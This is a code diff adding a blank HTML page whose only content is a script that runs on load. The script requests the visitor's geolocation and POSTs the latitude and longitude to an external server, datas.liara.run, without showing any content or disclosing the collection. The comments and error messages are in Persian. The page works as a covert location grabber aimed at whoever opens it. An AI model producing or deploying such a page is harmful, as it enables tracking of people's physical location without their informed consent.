@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    
+</body>
+<script>
+   async function getLocation() {
+        let arz
+        let tool
+        if (navigator.geolocation) {
+          await navigator.geolocation.getCurrentPosition(
+                (position) => {
+                 arz = position.coords.latitude;
+                 tool = position.coords.longitude;
+                sendLocationToBack(arz , tool)
+                },
+                (error) => {
+                    console.error("خطا در دریافت موقعیت:", error.message);
+                }
+            );
+        } else {
+            console.error("مرورگر شما از Geolocation پشتیبانی نمی‌کند.");
+        }
+        return {
+            arz,
+            tool
+        }
+    }
+    function sendLocationToBack(arz , tool) {
+      const data = {
+        arz,
+        tool
+      }
+      console.log(data);
+        fetch('https://datas.liara.run/api/data' , {
+            method: 'POST',
+            headers: {
+        'Content-Type': 'application/json'
+    },
+            body:JSON.stringify(data)
+        })
+    }
+    getLocation()
+</script>
+</html>
